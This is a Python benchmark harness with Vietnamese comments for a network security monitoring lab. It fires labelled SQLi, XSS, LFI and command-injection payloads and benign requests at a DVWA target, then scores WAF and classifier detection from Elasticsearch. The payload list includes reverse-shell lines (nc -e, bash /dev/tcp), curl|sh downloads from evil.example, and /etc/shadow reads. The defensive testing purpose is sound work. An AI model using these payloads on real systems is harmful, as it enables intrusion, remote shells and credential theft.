#!/usr/bin/env python3
"""tools/bench.py — phần chạy TRONG container của bộ benchmark NSM. Gọi qua tools/bench.sh, không chạy tay.

Chỉ dùng thư viện chuẩn của Python (chạy được trong image nsm-classifier). Lệnh con:
  check | detect | mttr | perf                          ở external_net (mỗi container một IP nguồn)
  collect-detect | collect-decisions | drain | report   ở monitor_net (đọc Elasticsearch / thư mục kết quả)
Kết quả in ra stdout (JSON một dòng; riêng report in Markdown); tiến độ in ra stderr.
"""
import argparse, base64, http.client, json, math, os, re, statistics, sys, threading, time, urllib.parse, urllib.request
from collections import Counter, defaultdict
from datetime import datetime, timezone

TARGET = os.getenv("BENCH_TARGET", "10.10.10.10")
# Host như trình duyệt thật (tên miền). Gửi tới IP thì CRS luật 920350 cộng sẵn 3 điểm cho mọi request.
HOST = os.getenv("NSM_HOST", "dvwa.local")
ES_URL = os.getenv("ES_URL", "http://elasticsearch:9200").rstrip("/")
UA_RX = re.compile(r"nsm-bench/[\w.-]+/(\d+)\b")
ATTACK_CLASSES = ("sqli", "xss", "lfi", "rce")


def note(msg):
    print(msg, file=sys.stderr, flush=True)


def out(obj):
    print(json.dumps(obj, ensure_ascii=False), flush=True)


# =====================================================================
# Bộ mẫu có nhãn sẵn (ground truth)
# =====================================================================
# điểm vào DVWA cho từng họ: (phương thức, đường dẫn, tham số chứa payload, tham số đi kèm)
EP = {"sqli": ("GET", "/vulnerabilities/sqli/", "id", {"Submit": "Submit"}),
      "xss": ("GET", "/vulnerabilities/xss_r/", "name", {}),
      "lfi": ("GET", "/vulnerabilities/fi/", "page", {}),
      "rce": ("POST", "/vulnerabilities/exec/", "ip", {"Submit": "Submit"})}


def ep(cls, value):
    m, path, pname, extra = EP[cls]
    return (m, path, {pname: value, **extra})


def page(path):
    return ("GET", path, None)


ATTACKS = {
    "sqli": [
        "1' OR '1'='1",
        "1' OR 1=1-- -",
        "1 UNION SELECT user,password FROM users-- -",
        "1' UNION ALL SELECT NULL,@@version#",
        "1' AND SLEEP(3)-- -",
        "1' AND extractvalue(1,concat(0x7e,database()))-- -",
        "1' AND updatexml(1,concat(0x7e,user()),1)-- -",
        "1'/**/UNION/**/SELECT/**/1,2-- -",
        "1' oR 1=1#",
        "admin'-- ",
        "1; DROP TABLE users-- -",
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -",
        "1' ORDER BY 3-- -",
        "-1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables-- -",
        "1 AND ASCII(SUBSTRING((SELECT database()),1,1))>64",
        "' OR ''='",
        "1' WAITFOR DELAY '0:0:5'--",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(document.cookie)>",
        "\"><script>alert(String.fromCharCode(88,83,83))</script>",
        "<iframe src=\"javascript:alert(1)\"></iframe>",
        "<a href=\"javascript:alert(1)\">x</a>",
        "<details open ontoggle=alert(1)>",
        "<ScRiPt>alert(1)</sCrIpT>",
        "'\"><img src=x onerror=prompt(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<video><source onerror=alert(1)></video>",
        "javascript:alert(document.domain)",
        "<math><mtext><script>alert(1)</script></mtext></math>",
        "<div style=\"background:url(javascript:alert(1))\">",
        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
    ],
    "lfi": [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "/etc/passwd",
        "../../../../etc/shadow",
        "../../../../proc/self/environ",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "file:///etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "../../../../var/log/apache2/access.log",
        "/etc/hosts",
        "../../../../etc/passwd\x00",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
        "expect://id",
        "../../../../../../boot.ini",
    ],
    "rce": [
        "127.0.0.1;id",
        "127.0.0.1|whoami",
        "127.0.0.1&&cat /etc/passwd",
        "127.0.0.1;uname -a",
        "127.0.0.1`id`",
        "127.0.0.1$(whoami)",
        "127.0.0.1||ls -la",
        "127.0.0.1;nc -e /bin/sh 10.0.0.1 4444",
        "127.0.0.1;wget http://evil.example/x.sh",
        "127.0.0.1;curl http://evil.example/s|sh",
        "127.0.0.1\nid",
        "127.0.0.1;bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "127.0.0.1;ping -c 3 10.0.0.1",
        "127.0.0.1;sleep 5",
        "127.0.0.1;/bin/cat /etc/shadow",
        "127.0.0.1 | head /etc/passwd",
    ],
}

# lành tính "thường": điều hướng và giá trị tham số bình thường
BENIGN = ([page(p) for p in ("/login.php", "/index.php", "/about.php", "/instructions.php", "/security.php",
                             "/dvwa/css/main.css", "/robots.txt", "/favicon.ico")]
          + [ep("sqli", v) for v in ("1", "2", "3", "5", "42")]
          + [ep("xss", v) for v in ("Alice", "Nguyễn Văn An", "Tran Thi Binh", "john.doe")]
          + [ep("lfi", v) for v in ("include.php", "file1.php", "file2.php", "file3.php")]
          + [ep("rce", v) for v in ("8.8.8.8", "192.168.1.1", "10.0.0.5", "example.com")]
          + [("GET", "/vulnerabilities/brute/", {"username": "admin", "password": "password", "Login": "Login"}),
             ("GET", "/vulnerabilities/brute/", {"username": "minh", "password": "matkhau2024", "Login": "Login"}),
             ("POST", "/login.php", {"username": "admin", "password": "password", "Login": "Login"})])

# lành tính "khó": văn bản bình thường nhưng có ký tự / từ khoá giống tấn công -> đo báo nhầm thật sự
BENIGN_HARD = ([ep("xss", v) for v in (
    "O'Brien", "Tom & Jerry", "rock 'n' roll", "x < y and y > z", "50% off today", "Hello (world)!",
    "select a laptop for school", "drop by tomorrow", "1=1 is always true", "don't stop me now",
    "price: $5; tax: 10%", "a;b;c", "C# and C++", "#hashtag", "user@example.com", "-- the end --",
    "3 * 4 = 12", "javascript tutorial for beginners", "script writing tips",
    # văn bản kỹ thuật thật (diễn đàn lập trình, tài liệu): giống tấn công nhất, dễ bị chặn nhầm nhất
    "SQL tip: SELECT name FROM users WHERE id = 1", "use <b>bold</b> for emphasis", "C:\\Users\\minh\\Documents")]
    + [ep("sqli", "1-2"), ep("lfi", "docs/manual.php"), ep("rce", "8.8.8.8 "),
       ("GET", "/login.php", {"redirect": "../home"}),
       ("GET", "/vulnerabilities/brute/", {"username": "minh", "password": "S3cure!Pass#2024", "Login": "Login"})])


def show(method, path, params):
    """Chuỗi hiển thị của một mẫu: giá trị payload nếu có, nếu không thì URL."""
    if params:
        for cls, (m, p, pname, _) in EP.items():
            if p == path and pname in params:
                return params[pname]
        return path + "?" + urllib.parse.urlencode(params)
    return path


def corpus(which):
    items = []
    if which == "attack":
        seq = 1
        for cls in ATTACK_CLASSES:
            for v in ATTACKS[cls]:
                m, p, params = ep(cls, v)
                items.append({"seq": seq, "gt": cls, "group": cls, "method": m, "path": p, "params": params})
                seq += 1
    else:
        seq = 1001
        for group, src in (("benign", BENIGN), ("benign-hard", BENIGN_HARD)):
            for m, p, params in src:
                items.append({"seq": seq, "gt": "benign", "group": group, "method": m, "path": p, "params": params})
                seq += 1
    for it in items:
        it["show"] = show(it["method"], it["path"], it["params"])
    return items


# =====================================================================
# HTTP
# =====================================================================
def gate_of(status, body):
    """Ai trả lời: gate1 = nginx chặn IP (trang lỗi mặc định của nginx), gate2 = ModSecurity/CRS (trang
    403 của Apache đi xuyên qua proxy), limit = nginx giới hạn kết nối, pass = tới được ứng dụng."""
    if status == 403:
        return "gate1" if b"<center>nginx</center>" in body else "gate2"
    if status == 429:
        return "limit"
    if status == 0:
        return "error"
    if status >= 500:
        return "http5xx"
    return "pass"


def req(method, path, params=None, ua="Mozilla/5.0 nsm-bench", timeout=10):
    headers = {"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
               "Accept-Language": "vi,en;q=0.8", "Connection": "close"}
    body = None
    if params is not None:
        qs = urllib.parse.urlencode(params)
        if method == "GET":
            path = path + "?" + qs
        else:
            body = qs.encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
    ts, t = time.time(), time.perf_counter()
    try:
        c = http.client.HTTPConnection(TARGET, 80, timeout=timeout)
        c.request(method, path, body=body, headers={"Host": HOST, **headers})
        r = c.getresponse()
        data = r.read()
        status = r.status
        c.close()
    except Exception as e:  # noqa: BLE001 — mọi lỗi mạng đều tính là "error"
        return {"ts": ts, "status": 0, "gate": "error", "lat_ms": round((time.perf_counter() - t) * 1000, 2),
                "err": type(e).__name__}
    return {"ts": ts, "status": status, "gate": gate_of(status, data),
            "lat_ms": round((time.perf_counter() - t) * 1000, 2)}


# =====================================================================
# Lệnh con chạy ở external_net
# =====================================================================
def cmd_check(a):
    r = req("GET", "/login.php")
    out(r)
    if r["gate"] != "pass":
        note(f"!! GET /login.php từ {a.ip}: mã {r['status']} ({r['gate']})")
        sys.exit(1)


def cmd_detect(a):
    items = corpus(a.set)
    note(f"   [{a.set}] gửi {len(items)} request từ {a.ip} ...")
    t0, res = time.time(), []
    for it in items:
        r = req(it["method"], it["path"], it["params"],
                ua=f"Mozilla/5.0 (X11; Linux x86_64) nsm-bench/{a.run}/{it['seq']}")
        res.append({k: it[k] for k in ("seq", "gt", "group", "method", "path", "show")} | r)
        time.sleep(a.gap)
    g = Counter(r["gate"] for r in res)
    note(f"   [{a.set}] xong: " + ", ".join(f"{k}={v}" for k, v in sorted(g.items())))
    out({"kind": "detect", "set": a.set, "ip": a.ip, "run": a.run, "t_start": t0, "t_end": time.time(),
         "requests": res})


DEFAULT_INTERVAL = {"sqli": 0.5, "rce": 0.5, "flood": 0.0, "recon": 0.1, "slow": 16.0}
DEFAULT_TIMEOUT = {"sqli": 90, "rce": 90, "flood": 60, "recon": 90, "slow": 330}


def scenario_iter(name, run):
    i = 0
    while True:
        if name in ("sqli", "slow"):
            yield ep("sqli", ATTACKS["sqli"][i % len(ATTACKS["sqli"])])
        elif name == "rce":
            yield ep("rce", ATTACKS["rce"][i % len(ATTACKS["rce"])])
        elif name == "flood":                       # request lành tính, chỉ có tần suất là bất thường
            yield page("/login.php")
        elif name == "recon":                       # dò đường dẫn không tồn tại -> 404
            yield page(f"/bench-{run}-{i}.php")
        else:
            raise SystemExit(f"kịch bản không hợp lệ: {name}")
        i += 1


def cmd_mttr(a):
    interval = DEFAULT_INTERVAL[a.scenario] if a.interval is None else a.interval
    timeout = DEFAULT_TIMEOUT[a.scenario] if a.timeout is None else a.timeout
    it = scenario_iter(a.scenario, a.run)
    gates, statuses = Counter(), Counter()
    t0, n, t_block = time.time(), 0, None
    while time.time() - t0 < timeout and n < a.max_req:
        m, p, params = next(it)
        r = req(m, p, params, ua=f"Mozilla/5.0 nsm-bench/{a.run}/{a.scenario}")
        n += 1
        gates[r["gate"]] += 1
        statuses[str(r["status"])] += 1
        if r["gate"] == "gate1":
            t_block = r["ts"] + r["lat_ms"] / 1000.0
            break
        if interval:
            time.sleep(max(0.0, interval - r["lat_ms"] / 1000.0))
    tag = f"   {a.scenario} #{a.rep} ({a.ip}): "
    if t_block:
        note(tag + f"bị chặn sau {t_block - t0:.1f} s, {n - 1} request trước đó")
    else:
        note(tag + f"KHÔNG bị chặn trong {timeout:.0f} s ({n} request)")
    out({"kind": "mttr", "scenario": a.scenario, "ip": a.ip, "rep": a.rep, "interval": interval, "timeout": timeout,
         "t_start": t0, "t_block": t_block, "blocked": t_block is not None, "n_sent": n,
         "n_before_block": n - (1 if t_block else 0), "gates": gates, "statuses": statuses})


def cmd_perf(a):
    lock = threading.Lock()
    lat, gates, statuses = [], Counter(), Counter()
    if a.kind == "attack":
        def mk(i): return ep("sqli", ATTACKS["sqli"][i % len(ATTACKS["sqli"])])
    else:
        def mk(i): return page("/login.php")
    t0 = time.time()
    deadline = t0 + a.duration

    def worker():
        i, ll, gg, ss = 0, [], Counter(), Counter()
        while time.time() < deadline:
            m, p, params = mk(i)
            i += 1
            r = req(m, p, params, ua="Mozilla/5.0 nsm-bench/perf")
            gg[r["gate"]] += 1
            ss[str(r["status"])] += 1
            if r["status"]:
                ll.append(r["lat_ms"])
        with lock:
            lat.extend(ll)
            gates.update(gg)
            statuses.update(ss)

    ths = [threading.Thread(target=worker) for _ in range(a.conc)]
    for t in ths:
        t.start()
    for t in ths:
        t.join()
    t1 = time.time()
    note(f"   [{a.label}] {a.ip}: {sum(gates.values())} request trong {t1 - t0:.1f} s")
    out({"kind": "perf", "label": a.label, "ip": a.ip, "conc": a.conc, "attack": a.kind == "attack",
         "duration": a.duration, "t_start": t0, "t_end": t1, "lat": lat, "gates": gates, "statuses": statuses})


# =====================================================================
# Lệnh con chạy ở monitor_net (Elasticsearch)
# =====================================================================
def es(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    headers = {"Content-Type": "application/json"}
    if os.getenv("ES_USER"):                       # Elasticsearch bắt buộc đăng nhập; mật khẩu đến từ .env
        cred = f"{os.getenv('ES_USER')}:{os.getenv('ES_PASSWORD', '')}".encode()
        headers["Authorization"] = "Basic " + base64.b64encode(cred).decode()
    rq = urllib.request.Request(ES_URL + path, data=data, method=method, headers=headers)
    with urllib.request.urlopen(rq, timeout=30) as r:
        return json.loads(r.read())


def iso(ts):
    return datetime.fromtimestamp(ts, tz=timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")


def epoch(s):
    return datetime.fromisoformat(str(s).replace("Z", "+00:00")).timestamp()


def web_query(ips, since):
    return {"bool": {"filter": [{"terms": {"src_ip.keyword": sorted(ips)}},
                                {"term": {"source.keyword": "web"}},
                                {"range": {"@timestamp": {"gte": iso(since)}}}]}}


def read_lines():
    recs = []
    for line in sys.stdin:
        line = line.strip()
        if line.startswith("{"):
            try:
                recs.append(json.loads(line))
            except ValueError:
                pass
    return recs


def cmd_collect_detect(a):
    recs = [r for r in read_lines() if r.get("kind") == "detect"]
    if not recs:
        raise SystemExit("collect-detect: không có dữ liệu detect ở stdin")
    ips = {r["ip"] for r in recs}
    since = min(r["t_start"] for r in recs) - 30
    want = {str(q["seq"]) for r in recs for q in r["requests"] if q["gate"] in ("pass", "gate2")}
    t0, found, last_new, last_n = time.time(), {}, time.time(), -1
    fields = ["@timestamp", "ua", "label", "confidence", "tier", "status", "waf_blocked",
              "evidence", "evidence_field", "matched"]
    while True:
        try:
            hits = es("POST", "/web-events-*/_search?ignore_unavailable=true",
                      {"size": 10000, "query": web_query(ips, since), "_source": fields})["hits"]["hits"]
        except Exception as e:  # noqa: BLE001
            note(f"   (ES chưa trả lời: {e})")
            hits = []
        for h in hits:
            m = UA_RX.search(h["_source"].get("ua") or "")
            if m:
                found[m.group(1)] = h["_source"]
        n = len(want & set(found))
        if n != last_n:
            last_n, last_new = n, time.time()
        if n >= len(want) or time.time() - last_new > 30 or time.time() - t0 > 150:
            break
        time.sleep(3)
    note(f"   tìm thấy {n}/{len(want)} sự kiện trong Elasticsearch sau {time.time() - t0:.0f} s")
    out({"kind": "detect-es", "expected": len(want), "found": n, "waited_s": round(time.time() - t0, 1),
         "docs": {k: v for k, v in found.items() if k in want}})


def cmd_collect_decisions(a):
    trials = [r for r in read_lines() if r.get("kind") == "mttr"]
    if not trials:
        raise SystemExit("collect-decisions: không có dữ liệu mttr ở stdin")
    ips = sorted({t["ip"] for t in trials})
    since = min(t["t_start"] for t in trials) - 5
    need = {t["ip"] for t in trials if t["blocked"]}
    t0 = time.time()
    while True:
        try:
            hits = es("POST", "/audit-decisions-*/_search?ignore_unavailable=true", {
                "size": 10000, "sort": [{"@timestamp": "asc"}],
                "query": {"bool": {"filter": [{"terms": {"src_ip.keyword": ips}},
                                              {"range": {"@timestamp": {"gte": iso(since)}}}]}}})["hits"]["hits"]
        except Exception as e:  # noqa: BLE001
            note(f"   (ES chưa trả lời: {e})")
            hits = []
        by_ip = defaultdict(list)
        for h in hits:
            s = h["_source"]
            by_ip[s.get("src_ip")].append({"ts": epoch(s["@timestamp"]), "decision": s.get("decision"),
                                           "reason": s.get("reason"), "cls": s.get("cls"),
                                           "alert_source": s.get("alert_source"),
                                           "confidence": s.get("confidence")})
        have = {ip for ip, ds in by_ip.items() if any(d["decision"] == "block" for d in ds)}
        if need <= have or time.time() - t0 > 40:
            break
        time.sleep(3)
    out({"kind": "decisions", "by_ip": by_ip})


def cmd_drain(a):
    recs = [r for r in read_lines() if r.get("kind") == "perf"]
    if not recs:
        raise SystemExit("drain: không có dữ liệu perf ở stdin")
    ips = {r["ip"] for r in recs}
    since = min(r["t_start"] for r in recs) - 2
    t_end = max(r["t_end"] for r in recs)
    expected = sum(r["gates"].get("pass", 0) + r["gates"].get("gate2", 0) for r in recs)
    samples, caught, t0 = [], None, time.time()
    while time.time() - t0 < a.timeout:
        try:
            n = es("POST", "/web-events-*/_count?ignore_unavailable=true", {"query": web_query(ips, since)})["count"]
        except Exception:  # noqa: BLE001
            n = None
        now = time.time()
        if n is not None:
            samples.append([round(now - t_end, 2), n])
            if n >= expected:
                caught = now
                break
        time.sleep(1)
    final = samples[-1][1] if samples else None
    note(f"   pipeline: {final}/{expected} sự kiện, " +
         (f"ghi kịp sau {caught - t_end:.1f} s kể từ khi ngừng tải" if caught else f"chưa đủ sau {a.timeout} s"))
    out({"kind": "drain", "expected": expected, "final": final, "t_end": t_end,
         "lag_s": round(caught - t_end, 2) if caught else None, "first_sample_s": samples[0][0] if samples else None,
         "samples": samples})


# =====================================================================
# Báo cáo Markdown
# =====================================================================
def num(x, d=1):
    return "—" if x is None else f"{x:.{d}f}".replace(".", ",")


def pct(k, n):
    return "—" if not n else num(100.0 * k / n) + " %"


def kn(k, n):
    return f"{k}/{n} ({pct(k, n)})"


def wilson(k, n, z=1.96):
    if not n:
        return None
    p = k / n
    den = 1 + z * z / n
    c = p + z * z / (2 * n)
    m = z * math.sqrt(p * (1 - p) / n + z * z / (4 * n * n))
    return max(0.0, (c - m) / den), min(1.0, (c + m) / den)


def ci(k, n):
    w = wilson(k, n)
    return "—" if not w else f"{w[0] * 100:.0f}–{w[1] * 100:.0f} %"


def pctl(xs, p):
    if not xs:
        return None
    s = sorted(xs)
    return s[min(len(s) - 1, max(0, math.ceil(p / 100.0 * len(s)) - 1))]


def code(s, n=70):
    s = str(s).replace("\n", "\\n").replace("\r", "\\r").replace("\x00", "\\0")
    if len(s) > n:
        s = s[:n - 1] + "…"
    s = s.replace("|", "\\|")
    return f"`` {s} ``" if "`" in s else f"`{s}`"


def table(head, rows):
    lines = ["| " + " | ".join(head) + " |", "|" + "|".join("---" for _ in head) + "|"]
    lines += ["| " + " | ".join(str(c) for c in r) + " |" for r in rows]
    return lines


REASON_VI = {"threshold": "ngưỡng ngắn", "long_window": "cửa sổ dài", "immediate:behaviour": "tầng 3 hành vi"}


def load_dir(d):
    def jl(name):
        p = os.path.join(d, name)
        recs = []
        if os.path.exists(p):
            with open(p, encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line.startswith("{"):
                        try:
                            recs.append(json.loads(line))
                        except ValueError:
                            pass
        return recs
    env = ""
    if os.path.exists(os.path.join(d, "env.txt")):
        with open(os.path.join(d, "env.txt"), encoding="utf-8", errors="replace") as f:
            env = f.read().strip()
    first = lambda xs: xs[0] if xs else None  # noqa: E731
    return {"detect": jl("detect-attack.json") + jl("detect-benign.json"), "detect_es": first(jl("detect-es.json")),
            "mttr": jl("mttr.jsonl"), "slow": jl("slow.jsonl"), "dec": first(jl("decisions.json")),
            "perf": jl("perf.jsonl"), "drain": first(jl("drain.json")),
            "st_idle": jl("stats-idle.jsonl"), "st_load": jl("stats-load.jsonl"), "env": env}


def detection(D):
    docs = (D["detect_es"] or {}).get("docs", {})
    rows = []
    for rec in D["detect"]:
        for r in rec["requests"]:
            doc = docs.get(str(r["seq"]))
            lab = doc.get("label") if doc else None
            waf = r["gate"] == "gate2"
            clf = lab is not None and lab != "benign"
            rows.append(r | {"waf": waf, "label": lab, "clf": clf, "sys": waf or clf, "doc": doc,
                             "reached": r["gate"] in ("pass", "gate2")})
    return rows


def metrics(att, ben, key):
    tp = sum(1 for x in att if x[key]); fp = sum(1 for x in ben if x[key])
    fn, tn = len(att) - tp, len(ben) - fp
    prec = tp / (tp + fp) if tp + fp else None
    rec = tp / len(att) if att else None
    f1 = 2 * prec * rec / (prec + rec) if prec and rec else None
    return {"tp": tp, "fn": fn, "fp": fp, "tn": tn, "prec": prec, "rec": rec, "f1": f1}


def trial_info(t, dec):
    ds = [d for d in (dec or {}).get("by_ip", {}).get(t["ip"], []) if d["ts"] >= t["t_start"] - 1]
    blk = next((d for d in ds if d["decision"] == "block"), None)
    upto = [d for d in ds if blk is None or d["ts"] <= blk["ts"]]
    counted = sum(1 for d in upto if d["decision"] == "count") + (1 if blk and blk["reason"] in ("threshold", "long_window") else 0)
    dup = sum(1 for d in upto if d["decision"] == "skip" and d["reason"] == "duplicate_sensor")
    total = (t["t_block"] - t["t_start"]) if t["blocked"] else None
    decide = (blk["ts"] - t["t_start"]) if blk else None
    enforce = (t["t_block"] - blk["ts"]) if (blk and t["blocked"]) else None
    g = t["gates"]
    return {"total": total, "decide": decide, "enforce": enforce, "blk": blk, "counted": counted, "dup": dup,
            "passed_g1": t["n_before_block"], "reached_app": g.get("pass", 0),
            "by": (REASON_VI.get(blk["reason"], blk["reason"]) if blk else "—")}


def stat3(xs, d=1):
    """trung vị (nhỏ nhất–lớn nhất)"""
    xs = [x for x in xs if x is not None]
    if not xs:
        return "—"
    med = statistics.median(xs)
    fm = lambda v: num(v, 0) if (d == 0 and v == int(v)) else num(v, max(d, 1))  # noqa: E731 — d=0: số nguyên in gọn
    if len(xs) == 1:
        return fm(xs[0])
    return f"{fm(med)} ({fm(min(xs))}–{fm(max(xs))})"


def mean(xs):
    xs = [x for x in xs if x is not None]
    return statistics.mean(xs) if xs else None


def parse_pct(s):
    try:
        return float(str(s).strip().rstrip("%"))
    except ValueError:
        return None


def parse_mem(s):
    s = str(s).split("/")[0].strip()
    m = re.match(r"([\d.]+)\s*([KMGT]?i?B)", s)
    if not m:
        return None
    mult = {"B": 1 / 2**20, "KiB": 1 / 1024, "KB": 1 / 1024, "MiB": 1, "MB": 1, "GiB": 1024, "GB": 1024,
            "TiB": 2**20, "TB": 2**20}.get(m.group(2), 1)
    return float(m.group(1)) * mult


def cmd_report(a):
    D = load_dir(a.dir)
    S, L = [], []          # S = gạch đầu dòng tóm tắt, L = phần thân
    run = a.run

    # ---------- 3. phát hiện ----------
    L.append("## 3. Chất lượng phát hiện (pha detect)")
    L.append("")
    if not D["detect"]:
        L += ["Không chạy pha này.", ""]
    else:
        rows = detection(D)
        att = [x for x in rows if x["gt"] != "benign"]
        ben = [x for x in rows if x["gt"] == "benign"]
        es_info = D["detect_es"] or {}
        L.append(f"Bộ mẫu: {len(att)} request tấn công (4 họ) và {len(ben)} request lành tính "
                 f"({sum(1 for x in ben if x['group'] == 'benign')} thường, "
                 f"{sum(1 for x in ben if x['group'] == 'benign-hard')} \"khó\": văn bản bình thường nhưng có ký tự "
                 f"hay từ khoá giống tấn công). Mỗi request mang một mã riêng trong User-Agent để ghép với sự kiện "
                 f"trong Elasticsearch: tìm thấy {es_info.get('found', 0)}/{es_info.get('expected', 0)} sự kiện "
                 f"sau {num(es_info.get('waited_s'), 0)} s.")
        L.append("")
        L.append("Ba cách tính: **Cổng 2** = ModSecurity/CRS trả 403; **bộ phân loại** = classifier gán nhãn khác "
                 "`benign` (tầng 1 regex hoặc tầng 2 model); **hệ thống** = một trong hai.")
        L.append("")
        L.append("### 3.1. Tổng hợp")
        L.append("")
        tr = []
        mm = {}
        for key, name in (("waf", "Cổng 2 (CRS)"), ("clf", "Bộ phân loại"), ("sys", "Hệ thống")):
            m = metrics(att, ben, key)
            mm[key] = m
            tr.append([name, kn(m["tp"], len(att)), ci(m["tp"], len(att)), kn(m["fp"], len(ben)), ci(m["fp"], len(ben)),
                       num(m["prec"] * 100) + " %" if m["prec"] is not None else "—",
                       num(m["f1"], 3) if m["f1"] is not None else "—"])
        L += table(["Lớp phòng thủ", "Phát hiện tấn công (recall)", "KTC 95 %", "Báo nhầm (FPR)", "KTC 95 %",
                    "Precision", "F1"], tr)
        L.append("")
        L.append("KTC 95 % = khoảng tin cậy Wilson; bộ mẫu nhỏ nên khoảng còn rộng.")
        L.append("")
        L.append("### 3.2. Theo họ tấn công")
        L.append("")
        tr = []
        for cls in ATTACK_CLASSES:
            xs = [x for x in att if x["gt"] == cls]
            if not xs:
                continue
            tr.append([cls, len(xs), kn(sum(x["waf"] for x in xs), len(xs)), kn(sum(x["clf"] for x in xs), len(xs)),
                       kn(sum(1 for x in xs if x["label"] == cls), len(xs)), kn(sum(x["sys"] for x in xs), len(xs)),
                       sum(1 for x in xs if x["reached"] and x["doc"] is None)])
        L += table(["Họ", "Mẫu", "Cổng 2 chặn", "Bộ phân loại phát hiện", "Đúng họ", "Hệ thống", "Thiếu trong ES"], tr)
        L.append("")
        L.append("### 3.3. Lưu lượng lành tính")
        L.append("")
        tr = []
        for grp, name in (("benign", "thường"), ("benign-hard", "khó")):
            xs = [x for x in ben if x["group"] == grp]
            if xs:
                tr.append([name, len(xs), kn(sum(x["waf"] for x in xs), len(xs)), kn(sum(x["clf"] for x in xs), len(xs)),
                           kn(sum(x["sys"] for x in xs), len(xs))])
        L += table(["Nhóm", "Mẫu", "Cổng 2 chặn nhầm", "Bộ phân loại báo nhầm", "Hệ thống báo nhầm"], tr)
        L.append("")
        L.append("### 3.4. Ma trận nhầm lẫn của bộ phân loại")
        L.append("")
        labels = sorted({x["label"] or "(thiếu)" for x in rows}, key=lambda s: (s == "benign", s))
        tr = []
        for grp in list(ATTACK_CLASSES) + ["benign", "benign-hard"]:
            xs = [x for x in rows if x["group"] == grp]
            if xs:
                c = Counter(x["label"] or "(thiếu)" for x in xs)
                tr.append([grp] + [c.get(l, "") for l in labels])
        L += table(["Thực tế \\ Nhãn"] + labels, tr)
        L.append("")
        tiers = Counter(str((x["doc"] or {}).get("tier")) for x in att if x["clf"])
        L.append("Tầng ra quyết định trên các tấn công bộ phân loại bắt được: "
                 + ", ".join(f"tầng {k}: {v}" for k, v in sorted(tiers.items())) + ".")
        L.append("")
        miss = [x for x in att if not x["sys"]]
        L.append(f"### 3.5. Tấn công lọt cả hai lớp ({len(miss)})")
        L.append("")
        if miss:
            L += table(["Họ", "Payload", "Mã HTTP", "Nhãn"],
                       [[x["gt"], code(x["show"]), x["status"], x["label"] or "(thiếu)"] for x in miss])
        else:
            L.append("Không có.")
        L.append("")
        only_waf = [x for x in att if x["waf"] and not x["clf"]]
        if only_waf:
            L.append(f"Ngoài ra {len(only_waf)} tấn công chỉ bị Cổng 2 chặn mà bộ phân loại không nhận ra: "
                     + ", ".join(code(x["show"], 40) for x in only_waf[:8]) + ("…" if len(only_waf) > 8 else "") + ".")
            L.append("")
        fps = [x for x in ben if x["sys"]]
        L.append(f"### 3.6. Báo nhầm ({len(fps)})")
        L.append("")
        if fps:
            L += table(["Nhóm", "Giá trị", "Cổng 2", "Nhãn", "Tầng", "Bằng chứng"],
                       [[x["group"], code(x["show"]), "403" if x["waf"] else "", x["label"] or "(thiếu)",
                         (x["doc"] or {}).get("tier") or "", code((x["doc"] or {}).get("evidence") or "", 40)]
                        for x in fps])
        else:
            L.append("Không có.")
        L.append("")
        hb = [x for x in ben if x["group"] == "benign-hard"]
        nb = [x for x in ben if x["group"] == "benign"]
        S.append(f"**Phát hiện tấn công:** hệ thống bắt {kn(mm['sys']['tp'], len(att))} request tấn công "
                 f"(KTC 95 % {ci(mm['sys']['tp'], len(att))}). Riêng Cổng 2 (CRS): {pct(mm['waf']['tp'], len(att))}; "
                 f"riêng bộ phân loại: {pct(mm['clf']['tp'], len(att))}.")
        S.append(f"**Báo nhầm:** lành tính thường {kn(sum(x['sys'] for x in nb), len(nb))}; "
                 f"lành tính khó {kn(sum(x['sys'] for x in hb), len(hb))}.")

    # ---------- 4. chặn IP ----------
    L.append("## 4. Thời gian ứng phó — chặn IP (pha mttr)")
    L.append("")
    if not D["mttr"]:
        L += ["Không chạy pha này.", ""]
    else:
        L.append("Mỗi lần chạy dùng một IP mới, gửi tấn công liên tục tới khi chính request của nó bị **Cổng 1** "
                 "(nginx) trả 403. **T tổng** = từ request đầu tiên tới lúc bị chặn; **T quyết định** = từ request "
                 "đầu tiên tới lúc responder ghi quyết định chặn; **T thực thi** = từ quyết định tới lúc nginx thật sự "
                 "chặn (enforcer + nạp lại nginx). Giá trị: trung vị (nhỏ nhất–lớn nhất), đơn vị giây.")
        L.append("")
        by_s = defaultdict(list)
        for t in D["mttr"]:
            by_s[t["scenario"]].append(t)
        desc = {"sqli": "SQLi GET, 2 request/s", "rce": "RCE trong thân POST, 2 request/s",
                "flood": "request lành tính dồn dập (một luồng)", "recon": "dò đường dẫn 404, 10 request/s"}
        tr, sm = [], []
        for s, ts in by_s.items():
            info = [trial_info(t, D["dec"]) for t in ts]
            nb = sum(t["blocked"] for t in ts)
            tr.append([s, desc.get(s, ""), f"{nb}/{len(ts)}", stat3([i["total"] for i in info]),
                       stat3([i["decide"] for i in info]), stat3([i["enforce"] for i in info]),
                       stat3([i["passed_g1"] for i in info], 0),
                       stat3([i["reached_app"] for i in info], 0),
                       ", ".join(sorted({i["by"] for i in info}))])
            med = [i["total"] for i in info if i["total"] is not None]
            sm.append(f"{s} {nb}/{len(ts)} lần, {num(statistics.median(med)) + ' s' if med else 'không chặn'}")
        L += table(["Kịch bản", "Mô tả", "Bị chặn", "T tổng", "T quyết định", "T thực thi",
                    "Request qua Cổng 1 trước khi chặn", "…trong đó tới được ứng dụng", "Quyết định bởi"], tr)
        L.append("")
